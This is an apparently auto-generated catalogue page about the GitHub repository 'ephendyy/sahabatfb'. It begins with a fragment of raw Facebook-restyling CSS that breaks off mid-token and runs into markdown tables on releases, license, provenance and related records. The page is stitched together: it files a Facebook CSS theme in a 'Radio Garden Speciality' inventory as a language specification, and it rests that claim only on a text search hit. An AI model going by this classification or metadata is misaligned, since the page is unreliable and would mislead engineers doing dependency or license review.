!important;}\n\n.fb_song_play_btn,.friend,.wrap,.uiTypeahead,.share,.raised,.donated,.recruited,.src
h_landing,.story_editor,.jewelCount span, .menuPulldown {background-color: transparent
!important;}\n\n.extended_link div {background-color: #fff
!important}\n\n#fbTimelineHeadline,.coverImage {width: 851px !important; margin-left: 1px
!important;}\n\n*:not(style*=border) {border-color: #000
!important;}\n\n#feed_content_section_applications *,#feed_header_section_friend_lists
*,.summary,.summary *,.UIMediaHeader_TitleWash,.UIMediaHeader_TitleWrapper,.feedbackView .comment th
div,.searchroot,.composerView th div,.reply th
div,.borderTagBox,.innerTagBox,.friend,.fbNubFlyoutTitlebar,.fbNubButton {border-color: transparent
!important;}\n\n.innerTagBox:hover {border-color: rgba(10,10,10,.45) !important;box-shadow: 0 0 5px
4px #9cf
!important;}\n\n.status_placeholder,.UIComposer_TDTextArea,.UIComposer_TextAreaShadow,.UIContentBox
,.box_column,form.comment div,.comment_box div,#tagger,.UIMediaItem_Wrapper,#chat_tab_bar
*,.UIActionMenu_ButtonOuter inputtype=\"button\",.inner_button,.UIActionButton_Link,.divider,.UIComp
oser_Attachment_TDTextArea,#confirm_button,#global_maps_link,.advanced_selector,#presence_ui
*,.fbFooterBorder,.wash,.main_body,.settings_screenshot,.uiBlingBox,.inputContainer
*,.uiMentionsInput,.uiTypeahead,.editNoteWrapperInput,.date_divider,.chatStatus,#headNav,.jewelCount
span,.fbFeedbackMentions .wrap,.uiSearchInput span,.uiSearchInput,.fbChatSidebarMessage,.devsitePage
.body >
.content,.timelineUnitContainer,.fbTimelineTopSection,.coverBorder,.pagesTimelineButtonPagelet
.counter,#pagelet_timeline_profile_actions
.counter,#navAccount.openToggler,#contentArea,.uiStreamStoryAttachmentOnly,.ogSliderAnimPagerPrev
.content,.ogSliderAnimPagerNext .content,.ogSliderAnimPagerPrev .wrapper,.ogSliderAnimPagerNext
.wrapper,.ogSingleStoryContent,.ogAggregationAnimSubstorySlideSingle,.uiCloseButton,
.ogAggregationPanelUFI, .ogAggregationPanelText {border: none !important;}\n\n.uiStream
.uiStreamHeaderTall {border-top: none !important; border-bottom: none
!important;}\n\n.attachment_link a:hover,inputtype=\"input\",inputtype=\"submit\":not(.fg_action_hid
e):not(.stat_elem):not(name=\"add\"):not(name=\"actionsreject\"):not(name=\"actionsaccept\"):not(val
ue=\"Find Friends\"):not(value=\"Share\"):not(value=\"Maybe\"):not(value=\"No\"):not(value=\"Yes\"):
not(value=\"Comment\"):not(value=\"Reply\"):not(value=\"Flag\"):not(type=\"submit\"),.UITabGrid_Link
:hover,.UIFilterList_Selected,.make_new_list_button_table,.confirm_button,.fb_menu_title
a:hover,.Tabset_selected {border-bottom-color: #000 !important;border-bottom-width: 1px
!important;border-bottom-style: solid !important;border-top-color: #000 !important;border-top-width:
1px !important;border-top-style: solid !important;border-left-color: #000 !important;border-left-
width: 1px !important;border-left-style: solid !important;border-right-color: #000
!important;border-right-width: 1px !important;border-right-style: solid !important;-moz-
appearance:none!important;}\n\n.UITabGrid_Link,.fb_menu_title
a,.button_main,.button_text,.button_left {border-bottom-color: transparent !important;border-bottom-
width: 1px !important;border-bottom-style: solid !important;border-top-color: transparent
!important;border-top-width: 1px !important;border-top-style: solid !important;border-left-color:
transparent !important;border-left-width: 1px !important;border-left-style: solid !important;border-
right-color: transparent !important;border-right-width: 1px !important;border-right-style: solid
!important;-moz-appearance:none!important;}\n\n.UIObjectListing_RemoveLink,.UIIntentionalStory_Close
Button,.remove,.x_to_hide,.fg_action_hide
a,.notif_del,.UIComposer_AttachmentArea_CloseButton,.delete_msg a,.ImageBlock_Hide,
.fbSettingsListItemDelete,.fg_action_hide,imgsrc=\" .uiCloseButton {background: url no-repeat
!important;t

## Operational Role

For a systems engineer, ephendyy/sahabatfb belongs in the Radio Garden Speciality inventory as part
of ecosystem capability mapping, dependency review, release awareness, and operational fit
assessment.

## Release Intelligence

| Channel | Status | Version | Date | Source | Reason |
| --- | --- | --- | --- | --- | --- |
| stable | partial |  | 2014-06-13T04:00:17Z | gh search repos "radio.garden" | gh_search_reports_activity_not_release_version |
| preview/nightly | unknown |  |  | unknown | gh_search_has_no_standard_nightly_channel |

## License And Use Alert

| Field | Value |
| --- | --- |
| Detected family | Unknown license |
| Evidence | {"key": "", "name": "", "url": ""} |
| Alert | Backup plan required: license metadata is missing, so do not assume Apache or MIT compatibility. |

## Engineering Notes

- Treat category as `language_specification` unless a later verified source gives a better classification.
- Keep provenance attached when merging duplicate identities; source evidence is not disposable.
- Stable release is unknown because `gh_search_reports_activity_not_release_version`.
- Preview/nightly metadata is unknown because `gh_search_has_no_standard_nightly_channel`.

## Provenance

<details>
<summary><strong>Provenance Details</strong> (click to expand)</summary>

| Kind | Status | Date | Detail |
| --- | --- | --- | --- |
| github_cli_search | forge-cli-derived | 2026-09-05 | `{"command": "gh search repos", "kind": "github_cli_search", "query": "\"radio.garden\"", "retrieved": "2026-09-05", "status": "forge-cli-derived"}` |

</details>

## Evidence

<details open>
<summary><strong>Evidence Records</strong> (click to collapse)</summary>

Evidence records merged into this identity: `1`.

- `github_search_radio_garden_speciality-37e5027f72f683` from `github_search_radio_garden_speciality` as `registry_expansion`

</details>

## Related Records

| Name | Category | Page |
| --- | --- | --- |
| jonasrmichel/radio-garden-openapi | Language Specification | [open](radio-garden-speciality-jonasrmichel-radio-garden-openapi-7e02eadb.md) |
| ZoltCyber/file.js | Language Specification | [open](radio-garden-speciality-zoltcyber-file-js-199ca939.md) |

## Category Index

[Api Abi Checker (215)](../by-category/api-abi-checker.md) · [Api Doc Generator (12)](../by-category/api-doc-generator.md) · [Assertion Mocking (46)](../by-category/assertion-mocking.md) · [Async Runtime (136)](../by-category/async-runtime.md)
[Benchmarking (194)](../by-category/benchmarking.md) · [Build System (982)](../by-category/build-system.md) · [Cli (561)](../by-category/cli.md) · [Codegen Codemod Refactoring (23)](../by-category/codegen-codemod-refactoring.md)
[Community Reference (116)](../by-category/community-reference.md) · [Compiler (175)](../by-category/compiler.md) · [Compiler Diagnostics (23)](../by-category/compiler-diagnostics.md) · [Compression (50)](../by-category/compression.md)
[Concurrency Parallelism (89)](../by-category/concurrency-parallelism.md) · [Configuration (128)](../by-category/configuration.md) · [Container Deployment (10)](../by-category/container-deployment.md) · [Coverage (14)](../by-category/coverage.md)
[Cryptography (173)](../by-category/cryptography.md) · [Data Science (38)](../by-category/data-science.md) · [Database Datastore (888)](../by-category/database-datastore.md) · [Datetime (223)](../by-category/datetime.md)
[Dead Code Dependency Analysis (5)](../by-category/dead-code-dependency-analysis.md) · [Debugger (44)](../by-category/debugger.md) · [Dependency Manager (101)](../by-category/dependency-manager.md) · [Documentation (103)](../by-category/documentation.md)
[Embedded Hardware (56)](../by-category/embedded-hardware.md) · [Ffi Bindings (452)](../by-category/ffi-bindings.md) · [Filesystem Os (1569)](../by-category/filesystem-os.md) · [Formatter (643)](../by-category/formatter.md)
[Framework (63)](../by-category/framework.md) · [Fuzzer (57)](../by-category/fuzzer.md) · [Game Engine Game Dev (354)](../by-category/game-engine-game-dev.md) · [Ide Editor Integration (1444)](../by-category/ide-editor-integration.md)
[Image Audio Dsp (430)](../by-category/image-audio-dsp.md) · [Interop Bindings (61)](../by-category/interop-bindings.md) · [Interpreter Runtime (267)](../by-category/interpreter-runtime.md) · [Jit Vm (63)](../by-category/jit-vm.md)
[Language Server (29)](../by-category/language-server.md) · **[Language Specification (1428)](../by-category/language-specification.md)** · [Library (5573)](../by-category/library.md) · [Lint Plugin (1)](../by-category/lint-plugin.md)
[Lint Rule Pack (48)](../by-category/lint-rule-pack.md) · [Linter (348)](../by-category/linter.md) · [Logging Observability (519)](../by-category/logging-observability.md) · [Machine Learning (770)](../by-category/machine-learning.md)
[Math Numeric Scientific (88)](../by-category/math-numeric-scientific.md) · [Memory Analyzer (96)](../by-category/memory-analyzer.md) · [Message Broker (40)](../by-category/message-broker.md) · [Networking Http (1029)](../by-category/networking-http.md)
[Other (14)](../by-category/other.md) · [Package Manager (441)](../by-category/package-manager.md) · [Parser Lexer Ast (1089)](../by-category/parser-lexer-ast.md) · [Precommit Ci Quality (298)](../by-category/precommit-ci-quality.md)
[Profiler (86)](../by-category/profiler.md) · [Project Scaffolding (132)](../by-category/project-scaffolding.md) · [Registry Repository (133)](../by-category/registry-repository.md) · [Sanitizer (14)](../by-category/sanitizer.md)
[Security Sast (336)](../by-category/security-sast.md) · [Serialization (394)](../by-category/serialization.md) · [Standard Library (25)](../by-category/standard-library.md) · [Static Analyzer (597)](../by-category/static-analyzer.md)
[Templating (2)](../by-category/templating.md) · [Testing Framework (604)](../by-category/testing-framework.md) · [Tutorial Book Styleguide (63)](../by-category/tutorial-book-styleguide.md) · [Type Checker (313)](../by-category/type-checker.md)
[Undefined Behavior Analyzer (1595)](../by-category/undefined-behavior-analyzer.md) · [Utility Library (103)](../by-category/utility-library.md) · [Visualization Gui (547)](../by-category/visualization-gui.md) · [Web Framework (476)](../by-category/web-framework.md)
